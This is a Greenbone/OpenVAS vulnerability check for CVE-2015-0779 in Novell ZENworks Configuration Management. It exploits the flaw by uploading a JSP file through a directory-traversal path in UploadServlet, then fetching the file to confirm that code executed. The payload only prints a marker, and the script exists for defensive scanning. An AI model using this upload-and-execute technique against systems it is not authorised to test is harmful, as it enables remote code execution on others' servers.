if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105251" );
	script_cve_id( "CVE-2015-0779" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Novell ZENworks Configuration Management Arbitrary File Upload" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2015/Apr/21" );
	script_tag( name: "vuldetect", value: "Try to upload and execute a '.jsc' file." );
	script_tag( name: "insight", value: "Remote code execution via file upload and directory traversal in '/zenworks/UploadServlet'" );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "summary", value: "The remote ZENworks Configuration Management is prone to an unauthenticated
  arbitrary file upload vulnerability" );
	script_tag( name: "affected", value: "ZENworks Configuration Management < 11.3.2" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-04-10 20:01:11 +0200 (Fri, 10 Apr 2015)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "gb_novell_zenworks_configuration_management_detect.sc" );
	script_require_ports( "Services/www", 443 );
	script_mandatory_keys( "novell_zenworks_configuration_management/installed" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 443 );
url = "/zenworks/UploadServlet";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!buf || !ContainsString( buf, "ZENworks File Upload" )){
	exit( 0 );
}
str = "xt_test_";
rand = rand() + "_";
ex = "<%out.print(\"" + str + rand + "\".replace(" + "'x','v'" + "));out.print(Byte.decode(\"0x2A\"));%>";
host = http_host_name( port: port );
len = strlen( ex );
vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + "_cve_2015_0779.jsc";
paths = make_list( "../../../opt/novell/zenworks/share/tomcat/webapps/",
	 "../webapps/" );
for path in paths {
	vuln_url = "/zenworks/UploadServlet?uid=" + path + "zenworks/jsp/core/upload&filename=";
	req = "POST " + vuln_url + file + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "Content-Type: application/octet-stream\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + ex;
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!buf || !ContainsString( buf, "<status>success</status>" )){
		continue;
	}
	upload_url = "/zenworks/jsp/core/upload/" + file;
	req = http_get( item: upload_url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(ContainsString( buf, "vt_test_" + rand + "42" )){
		report = http_report_vuln_url( port: port, url: upload_url );
		report += "\n" + http_report_vuln_url( port: port, url: vuln_url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

